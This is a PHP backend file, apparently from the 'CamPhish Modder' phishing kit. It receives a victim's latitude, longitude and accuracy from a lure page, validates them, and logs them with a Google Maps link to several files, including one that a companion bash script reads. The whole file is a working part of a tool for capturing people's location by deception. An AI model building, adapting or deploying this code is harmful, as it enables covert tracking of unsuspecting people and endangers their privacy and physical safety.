<?php
// CamPhish Modder v3.0 - location.php (stable + validated)
header('Content-Type: application/json');

$latitude  = isset($_POST['lat']) ? trim((string)$_POST['lat']) : '';
$longitude = isset($_POST['lon']) ? trim((string)$_POST['lon']) : '';
$accuracy  = isset($_POST['acc']) ? trim((string)$_POST['acc']) : 'Unknown';

if ($latitude === '' || $longitude === '') {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
    exit;
}

// validate ตัวเลข + ขอบเขตพิกัดจริง
if (!is_numeric($latitude) || !is_numeric($longitude)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid coordinates']);
    exit;
}
$lat_f = (float)$latitude;
$lon_f = (float)$longitude;
if ($lat_f < -90 || $lat_f > 90 || $lon_f < -180 || $lon_f > 180) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Coordinates out of range']);
    exit;
}
if ($accuracy !== 'Unknown') {
    $accuracy = is_numeric($accuracy) ? ((float)$accuracy) . '' : 'Unknown';
}

$date = date('dMYHis');
$uniq = substr(md5(uniqid((string)mt_rand(), true)), 0, 6);

$data = "Latitude: " . $lat_f . "\r\n"
      . "Longitude: " . $lon_f . "\r\n"
      . "Accuracy: " . $accuracy . " meters\r\n"
      . "Google Maps: https://www.google.com/maps/place/" . $lat_f . "," . $lon_f . "\r\n"
      . "Date: " . $date . "\r\n";

$file = 'location_' . $date . '_' . $uniq . '.txt';

try {
    if (!is_dir('saved_locations')) {
        @mkdir('saved_locations', 0755, true);
    }

    $ok = @file_put_contents($file, $data, LOCK_EX);
    if ($ok === false) {
        throw new Exception("Could not write location file");
    }

    // ไฟล์สำหรับ bash อ่านทันที
    @file_put_contents("current_location.txt", $data, LOCK_EX);
    @file_put_contents("LocationLog.log", "Location captured $date\n", FILE_APPEND | LOCK_EX);

    // master log สะสม
    @file_put_contents('saved.locations.txt', "\n=== New Location Captured [$date] ===\n" . $data . "\n", FILE_APPEND | LOCK_EX);

    // สำเนาเข้า saved_locations ทันที (bash จะย้ายไฟล์หลักไปอีกที ถ้าซ้ำก็ไม่พัง)
    @copy($file, 'saved_locations/' . $file);

    echo json_encode(['status' => 'success', 'message' => 'Location data received']);
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
}
exit;
